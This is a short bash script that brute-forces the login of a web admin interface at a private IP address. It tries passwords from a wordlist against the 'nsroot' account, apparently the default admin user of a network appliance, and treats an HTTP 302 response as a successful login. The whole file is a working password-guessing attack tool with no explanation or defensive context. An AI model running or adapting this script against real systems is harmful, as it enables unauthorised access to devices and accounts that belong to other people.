#!/bin/bash

while read line; do
    #login=$(curl -x http://127.0.0.1:8080/ -s -k -o /dev/null -d "username=nsroot&password=${line}&url=&timezone_offset=3600" -X POST http://192.168.1.88/login/do_login -w "%{http_code}")
    login=$(curl -s -k -o /dev/null -d "username=nsroot&password=${line}&url=&timezone_offset=3600" -X POST http://192.168.1.88/login/do_login -w "%{http_code}")

    if [ $login '==' "302" ]
        then
        echo "[!] Password found: $line"
        break
    else
        echo "[+] Trying: $line"
    fi
done < passwords.txt
